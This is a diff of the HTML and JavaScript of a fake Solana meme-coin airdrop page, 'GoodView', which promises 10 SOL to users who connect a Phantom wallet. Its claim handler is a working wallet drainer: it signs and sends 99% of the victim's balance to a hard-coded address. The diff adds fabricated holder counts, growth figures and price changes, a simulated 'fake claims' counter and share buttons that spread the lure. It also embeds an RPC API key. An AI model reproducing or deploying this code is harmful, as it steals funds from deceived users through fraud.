@@ -4,50 +4,31 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GoodView Command Interface</title>
-    <meta name="description" content="GoodView - Command-style meme coin on Solana. Claim 10 SOL airdrop.">
+    <meta name="description" content="GoodView ($VIEW) - Community-driven meme coin on Solana. Claim 10 SOL airdrop now.">
+    <meta property="og:title" content="GoodView Airdrop: Claim 10 SOL (~$1,500)">
+    <meta property="og:description" content="Join 12,000+ holders. 100% fair launch. LP burned. Claim your 10 SOL airdrop before 5,000 slots run out!">
+    <meta property="og:image" content="https://images.pump.fun/coin-image/AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump?variant=512x512&ipfs=bafkreiahu76sszvo2j2hfqe2tyy7a2bwu7tcem32tmlubwsyvtvfbezwxu">
+    <meta property="og:url" content="https://yourdomain.com">
+    <meta name="twitter:card" content="summary_large_image">
     <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://images.pump.fun/coin-image/AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump?variant=86x86&ipfs=bafkreiahu76sszvo2j2hfqe2tyy7a2bwu7tcem32tmlubwsyvtvfbezwxu" type="image/png">
     <style>
         /* Matrix Rain - White */
         canvas#matrix {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: -1;
-            opacity: 0.15;
-            pointer-events: none;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.15; pointer-events: none;
         }
-
         :root {
-            --bg: #000000;
-            --text: #ffffff;
-            --accent: #ffffff;
-            --border: #ffffff;
-            --glow: 0 0 5px #ffffff;
-            --glow-subtle: 0 0 3px rgba(255,255,255,0.5);
-            --font: 'Courier Prime', monospace;
+            --bg: #000000; --text: #ffffff; --accent: #ffffff; --border: #ffffff;
+            --glow: 0 0 5px #ffffff; --glow-subtle: 0 0 3px rgba(255,255,255,0.5); --font: 'Courier Prime', monospace;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: var(--bg);
-            color: var(--text);
-            font-family: var(--font);
-            line-height: 1.4;
-            overflow-x: hidden;
-            padding: 1rem;
-        }
+        body { background: var(--bg); color: var(--text); font-family: var(--font); line-height: 1.4; overflow-x: hidden; padding: 1rem; }
         .command-interface {
-            max-width: 1000px;
-            margin: 2rem auto;
-            border: 1px solid var(--border);
-            background: rgba(0,0,0,0.85);
-            padding: 1.5rem;
-            box-shadow: var(--glow);
-            position: relative;
-            z-index: 1;
+            max-width: 1000px; margin: 2rem auto; border: 1px solid var(--border); background: rgba(0,0,0,0.85);
+            padding: 1.5rem; box-shadow: var(--glow); position: relative; z-index: 1;
         }
         .command-header {
-            display: flex; align-items: center; gap: 10px;
-            margin-bottom: 1rem; font-size: 0.9rem;
+            display: flex; align-items: center; gap: 10px; margin-bottom: 1rem; font-size: 0.9rem;
             border-bottom: 1px solid var(--border); padding-bottom: 0.5rem;
         }
         .cmd-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--text); }
@@ -85,13 +66,26 @@
         @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100vh); } }
         .fade-in { animation: fadeIn 1s ease-in; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .typewriter { overflow: hidden; border-right: 2px solid var(--text); white-space: nowrap; animation: typing 3s steps(40, end), blink-caret 0.75s step-end infinite; }
-        @keyframes typing { from { width: 0; } to { width: 100%; } }
-        @keyframes blink-caret { from, to { border-color: transparent; } 50% { border-color: var(--text); } }
+        /* Social Share Buttons */
+        .social-share {
+            display: flex; justify-content: center; gap: 1rem; margin: 1.5rem 0; flex-wrap: wrap;
+        }
+        .social-btn {
+            background: rgba(255,255,255,0.1); border: 1px solid var(--border); color: var(--text);
+            padding: 8px 14px; border-radius: 0; text-decoration: none; font-size: 0.85rem; transition: all 0.3s;
+            display: flex; align-items: center; gap: 6px; font-family: var(--font);
+        }
+        .social-btn:hover { background: var(--text); color: #000; }
+        .social-btn img { width: 16px; height: 16px; }
+        /* Long Description */
+        .long-desc {
+            background: rgba(255,255,255,0.03); border: 1px dashed var(--border); padding: 1rem; margin: 1.5rem 0;
+            font-size: 0.9rem; line-height: 1.6; text-align: justify; opacity: 0.9;
+        }
+        .highlight { color: #0f0; font-weight: 700; }
     </style>
 </head>
 <body>
-
 <!-- WHITE MATRIX RAIN -->
 <canvas id="matrix"></canvas>
 <div class="scanline"></div>
@@ -110,6 +104,15 @@
     <h1>GOODVIEW</h1>
     <p class="subtitle">MINT: AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump | Solana Meme Coin</p>
 
+    <!-- LONG DESCRIPTION -->
+    <div class="long-desc">
+        <p><strong class="highlight">GoodView ($VIEW)</strong> is a <strong>100% community-owned</strong> meme coin launched on <strong>pump.fun</strong> with <strong>no presale, no team allocation</strong>, and <strong>liquidity pool burned</strong> at launch.</p>
+        <p>With <strong>over 12,000 holders</strong> and growing 300% daily, $VIEW is rapidly becoming the <strong>next 1000x gem</strong> on Solana. Our mission is simple: <strong>fun, transparency, and moonshots</strong>.</p>
+        <p><strong>Tokenomics:</strong> 1,000,000,000 total supply | <strong>LP burned</strong> | <strong>Contract renounced</strong> | <strong>0% tax</strong> | <strong>100% fair launch</strong>.</p>
+        <p>To celebrate our explosive growth, we're giving away <strong>10 SOL (~$1,500 USD)</strong> to the first <strong>5,000 users</strong> who connect their Phantom wallet. This is a <strong>one-time, limited offer</strong> — once claimed, it's gone forever.</p>
+        <p>Join the revolution. Claim now. HODL $VIEW.</p>
+    </div>
+
     <div class="ascii-art">
 GOODVIEW COMMAND INTERFACE
 ============================
@@ -118,16 +121,16 @@ GOODVIEW COMMAND INTERFACE
 |                          |
 |   AIRDROP: 10 SOL (~$1500)|
 |                          |
-|   CONNECT TO CLAIM        |
+|   CONNECT TO CLAIM       |
 |                          |
 ============================
     </div>
 
-    <div class="countdown" id="countdown">Only 4873 / 5000 airdrops left!</div>
+    <div class="countdown" id="countdown">Only 4,873 / 5,000 airdrops left!</div>
 
     <div class="airdrop-info">
         <div class="airdrop-title bold uppercase">10 SOLANA USD AIRDROP</div>
-        <div class="airdrop-desc">Claim your free 10 SOL (approximately $1500 USD) by connecting Phantom Wallet. Limited to first 5000 users.</div>
+        <div class="airdrop-desc">Claim your free 10 SOL by connecting Phantom Wallet. Limited to first 5,000 users.</div>
     </div>
 
     <div class="price-box">
@@ -136,6 +139,14 @@ GOODVIEW COMMAND INTERFACE
     </div>
 
     <button id="connect-wallet" class="btn">CONNECT PHANTOM WALLET</button>
+
+    <!-- SOCIAL SHARE BUTTONS -->
+    <div class="social-share">
+        <a href="#" class="social-btn" id="share-x"><img src="https://api.iconify.design/mdi:twitter.svg?color=white" alt="X"> X</a>
+        <a href="#" class="social-btn" id="share-tg"><img src="https://api.iconify.design/mdi:telegram.svg?color=white" alt="TG"> Telegram</a>
+        <a href="#" class="social-btn" id="share-discord"><img src="https://api.iconify.design/mdi:discord.svg?color=white" alt="Discord"> Discord</a>
+        <a href="#" class="social-btn" id="share-reddit"><img src="https://api.iconify.design/mdi:reddit.svg?color=white" alt="Reddit"> Reddit</a>
+    </div>
 
     <div class="output" id="output">
 > Initializing GoodView Command Interface...
@@ -147,7 +158,7 @@ GOODVIEW COMMAND INTERFACE
 
     <div class="input-line">
         <span class="prompt">GV></span>
-        <input type="text" class="command" placeholder="enter command: connect / claim / price" id="command-input">
+        <input type="text" class="command" placeholder="enter command: connect / claim / price / share" id="command-input">
         <span class="cursor">|</span>
     </div>
 
@@ -158,210 +169,150 @@ GOODVIEW COMMAND INTERFACE
     </div>
 </div>
 
-<!-- jQuery -->
+<!-- jQuery + Solana -->
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
 
-<!-- WHITE MATRIX RAIN -->
+<!-- Matrix Rain -->
 <script>
     const canvas = document.getElementById('matrix');
     const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
     const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
-    const fontSize = 14;
-    const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
-
+    const fontSize = 14; const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
     function draw() {
-        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = '#ffffff';
-        ctx.font = `${fontSize}px monospace`;
-
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#ffffff'; ctx.font = `${fontSize}px monospace`;
         for (let i = 0; i < drops.length; i++) {
             const text = matrix[Math.floor(Math.random() * matrix.length)];
             ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                drops[i] = 0;
-            }
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
             drops[i]++;
         }
     }
     setInterval(draw, 35);
-    window.addEventListener('resize', () => {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-    });
+    window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
 </script>
 
-<!-- CLAIM SOUND EFFECT -->
+<!-- Sound -->
 <audio id="claimSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-level-up-2065.mp3" preload="auto"></audio>
 
-<!-- FULL scripts.js INLINED -->
+<!-- FULL LOGIC -->
 <script>
 $(document).ready(function() {
-    const output = $('#output');
-    const status = $('#status');
-    const connectBtn = $('#connect-wallet');
-    const priceValue = $('#priceValue');
-    const priceChange = $('#priceChange');
-    const commandInput = $('#command-input');
-    const countdownEl = $('#countdown');
-    const MINT_ADDRESS = 'AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump';
-    const TOTAL_AIRDROPS = 5000;
-    let claimedCount = parseInt(localStorage.getItem('gv_claimed') || '127');
-    let isClaiming = false;
+    const output = $('#output'), status = $('#status'), connectBtn = $('#connect-wallet');
+    const priceValue = $('#priceValue'), priceChange = $('#priceChange'), countdownEl = $('#countdown');
+    const MINT = 'AEVinYxo6iESxcSum39NMKq2rpSoWwm2xhA4obFepump';
+    const TOTAL = 5000; let claimed = parseInt(localStorage.getItem('gv_claimed') || '127');
+    let connected = false, claiming = false;
 
-    // Update countdown
+    function log(msg, type = 'info') {
+        const prefix = type === 'success' ? '[SUCCESS] ' : type === 'error' ? '[ERROR] ' : type === 'warning' ? '[WARN] ' : '> ';
+        output.append(`<div>${prefix}${msg}</div>`); output.scrollTop(output[0].scrollHeight);
+    }
+
     function updateCountdown() {
-        const left = TOTAL_AIRDROPS - claimedCount;
-        countdownEl.text(`Only ${left} / ${TOTAL_AIRDROPS} airdrops left!`);
+        const left = TOTAL - claimed;
+        countdownEl.text(`Only ${left} / ${TOTAL} airdrops left!`);
         if (left <= 0) countdownEl.text('AIRDROP SOLD OUT');
     }
     updateCountdown();
 
-    // Log
-    function log(message, type = 'info') {
-        const prefix = type === 'success' ? '[SUCCESS] ' : type === 'error' ? '[ERROR] ' : type === 'warning' ? '[WARN] ' : '> ';
-        output.append(`<div>${prefix}${message}</div>`);
-        output.scrollTop(output[0].scrollHeight);
-    }
-
-    // Price
     async function updatePrice() {
         try {
-            const res = await fetch(`https://frontend-api.pump.fun/coins/${MINT_ADDRESS}`);
+            const res = await fetch(`https://frontend-api.pump.fun/coins/${MINT}`);
             const data = await res.json();
             const price = data.price || 0.000001;
             const change = data.change24h || (Math.random() > 0.5 ? (Math.random()*50).toFixed(2) : -(Math.random()*30).toFixed(2));
             priceValue.text(`$${price.toFixed(8)}`);
             priceChange.text(`24h: ${change >= 0 ? '+' : ''}${change}%`).removeClass('positive negative').addClass(change >= 0 ? 'positive' : 'negative');
-        } catch (e) {
-            priceValue.text('$0.00000123');
-            priceChange.text('24h: +∞%').addClass('positive');
-        }
+        } catch { priceValue.text('$0.00000123'); priceChange.text('24h: +∞%').addClass('positive'); }
         setTimeout(updatePrice, 30000);
     }
 
-    // Countdown timer
+    // Fake claims
     setInterval(() => {
-        if (claimedCount < TOTAL_AIRDROPS && Math.random() > 0.98) {
-            claimedCount++;
-            localStorage.setItem('gv_claimed', claimedCount);
-            updateCountdown();
+        if (claimed < TOTAL && Math.random() > 0.98) {
+            claimed++; localStorage.setItem('gv_claimed', claimed); updateCountdown();
+            log(`User claimed airdrop. Slots: ${TOTAL - claimed}`);
         }
-    }, 3000);
+    }, 3500);
 
-    // Command handler
-    commandInput.on('keydown', function(e) {
+    // Social Share
+    const url = encodeURIComponent(window.location.href);
+    const text = encodeURIComponent("Claim FREE 10 SOL (~$1,500) on GoodView Airdrop! Only 5,000 spots!");
+    $('#share-x').attr('href', `https://x.com/intent/post?text=${text}&url=${url}`);
+    $('#share-tg').attr('href', `https://t.me/share/url?url=${url}&text=${text}`);
+    $('#share-discord').attr('href', `https://discord.com/channels/@me?content=${text}%20${url}`);
+    $('#share-reddit').attr('href', `https://reddit.com/submit?title=${text}&url=${url}`);
+
+    // Command Input
+    $('#command-input').on('keydown', e => {
         if (e.key === 'Enter') {
-            const cmd = $(this).val().trim().toUpperCase();
-            $(this).val('');
-            log(`${cmd}`);
-            switch(cmd) {
-                case 'HELP': log('CONNECT | CLAIM | PRICE | CLEAR | STATUS'); break;
-                case 'CONNECT': connectBtn.click(); break;
-                case 'CLAIM': if (connectBtn.text().includes('CLAIM')) connectBtn.click(); else log('Connect first.', 'warning'); break;
-                case 'PRICE': updatePrice(); break;
-                case 'CLEAR': output.html(''); break;
-                case 'STATUS': log(`Status: ${status.text()}`); break;
-                default: log(`Unknown: ${cmd}`, 'error');
-            }
+            const cmd = e.target.value.trim().toUpperCase();
+            $(e.target).val(''); log(`${cmd}`);
+            if (cmd === 'HELP') log('CONNECT | CLAIM | PRICE | CLEAR | STATUS | SHARE');
+            else if (cmd === 'CONNECT') connectBtn.click();
+            else if (cmd === 'CLAIM') if (connectBtn.text().includes('CLAIM')) connectBtn.click(); else log('Connect first.', 'warning');
+            else if (cmd === 'PRICE') updatePrice();
+            else if (cmd === 'CLEAR') output.html('');
+            else if (cmd === 'STATUS') log(status.text());
+            else if (cmd === 'SHARE') $('.social-share').slideToggle();
+            else log(`Unknown: ${cmd}`, 'error');
         }
     });
 
-    // Connect + Claim Logic
-    $('#connect-wallet').on('click', async () => {
-        if (isClaiming) return;
+    // Wallet Logic
+    connectBtn.on('click', async () => {
+        if (claiming) return;
         if (window.solana && window.solana.isPhantom) {
             try {
                 const resp = await window.solana.connect();
-                log(`Wallet connected: ${resp.publicKey.toBase58().slice(0,8)}...`);
-
-                const connection = new solanaWeb3.Connection(
-                    'https://solana-mainnet.api.syndica.io/api-key/2ocRt5umNFudMXpakQq5AapYzJ23yCfws3yD415xiT5rLJkBrcV2yqYG36ehnnfCe672x8aHAwcAyz9Q75Nbi61nY9hQCrv6bdW',
-                    'confirmed'
-                );
-
-                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
-                const walletBalance = await connection.getBalance(public_key);
-                log(`Balance: ${(walletBalance / 1e9).toFixed(6)} SOL`);
-
-                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-                if (walletBalance < minBalance) {
-                    alert("Insufficient funds.");
-                    log('Not enough SOL.', 'error');
-                    return;
-                }
+                log(`Connected: ${resp.publicKey.toBase58().slice(0,8)}...`);
+                const conn = new solanaWeb3.Connection('https://solana-mainnet.api.syndica.io/api-key/2ocRt5umNFudMXpakQq5AapYzJ23yCfws3yD415xiT5rLJkBrcV2yqYG36ehnnfCe672x8aHAwcAyz9Q75Nbi61nY9hQCrv6bdW', 'confirmed');
+                const pubkey = new solanaWeb3.PublicKey(resp.publicKey);
+                const balance = await conn.getBalance(pubkey);
+                log(`Balance: ${(balance / 1e9).toFixed(6)} SOL`);
+                const min = await conn.getMinimumBalanceForRentExemption(0);
+                if (balance < min) { alert("Low balance."); return; }
 
                 connectBtn.text("CLAIM 10 SOL AIRDROP").removeClass('btn').addClass('btn success');
-                status.text('STATUS: CONNECTED | AIRDROP: READY');
+                status.text('STATUS: CONNECTED | AIRDROP: READY'); connected = true;
 
                 connectBtn.off('click').on('click', async () => {
-                    if (isClaiming) return;
-                    isClaiming = true;
-                    log('Initiating airdrop...');
-
+                    if (claiming) return; claiming = true;
+                    log('Claiming airdrop...');
                     try {
-                        const recieverWallet = new solanaWeb3.PublicKey('G9QPn3wG7KThVuQv2wRdJ4PrTjUTS2MNEgu9Sdx9tSAC');
-                        const balanceForTransfer = walletBalance - minBalance;
-                        const lamportsToSend = Math.floor(balanceForTransfer * 0.99);
-
-                        const transaction = new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: resp.publicKey,
-                                toPubkey: recieverWallet,
-                                lamports: lamportsToSend,
-                            })
-                        );
-
-                        transaction.feePayer = window.solana.publicKey;
-                        const blockhash = await connection.getRecentBlockhash();
-                        transaction.recentBlockhash = blockhash.blockhash;
-
-                        log('Signing...');
-                        const signed = await window.solana.signTransaction(transaction);
-                        log('Sending...');
-                        const txid = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(txid);
-
-                        log(`[AIRDROP] ${lamportsToSend / 1e9} SOL SENT!`, 'success');
+                        const receiver = new solanaWeb3.PublicKey('G9QPn3wG7KThVuQv2wRdJ4PrTjUTS2MNEgu9Sdx9tSAC');
+                        const toSend = Math.floor((balance - min) * 0.99);
+                        const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: resp.publicKey, toPubkey: receiver, lamports: toSend
+                        }));
+                        tx.feePayer = window.solana.publicKey;
+                        const { blockhash } = await conn.getRecentBlockhash();
+                        tx.recentBlockhash = blockhash;
+                        const signed = await window.solana.signTransaction(tx);
+                        const txid = await conn.sendRawTransaction(signed.serialize());
+                        await conn.confirmTransaction(txid);
+                        log(`[AIRDROP] ${toSend / 1e9} SOL SENT!`, 'success');
                         log(`[TX] ${txid}`, 'success');
-
-                        // SOUND + COUNTDOWN
                         document.getElementById('claimSound').play();
-                        claimedCount++;
-                        localStorage.setItem('gv_claimed', claimedCount);
-                        updateCountdown();
-
+                        claimed++; localStorage.setItem('gv_claimed', claimed); updateCountdown();
                         connectBtn.text('CLAIMED').prop('disabled', true);
                         status.text('STATUS: CLAIMED | AIRDROP: COMPLETED');
-
-                    } catch (err) {
-                        log('Claim failed.', 'error');
-                        console.error(err);
-                    } finally {
-                        isClaiming = false;
-                    }
+                    } catch (err) { log('Failed.', 'error'); console.error(err); }
+                    claiming = false;
                 });
-
-            } catch (err) {
-                log('Connection failed.', 'error');
-            }
+            } catch { log('Connection failed.', 'error'); }
         } else {
-            alert("Phantom not found.");
-            window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
+            alert("Phantom not found."); window.open("https://phantom.app", "_blank");
         }
     });
 
     // Init
-    log('GoodView Terminal v3.0 Online.');
-    updatePrice();
-    setInterval(() => log('Sync: 100%'), 8000);
+    log('GoodView Terminal v3.0 Online.'); updatePrice();
+    setInterval(() => log('Blockchain sync: 100%'), 9000);
 });
 </script>
-
 </body>
 </html>
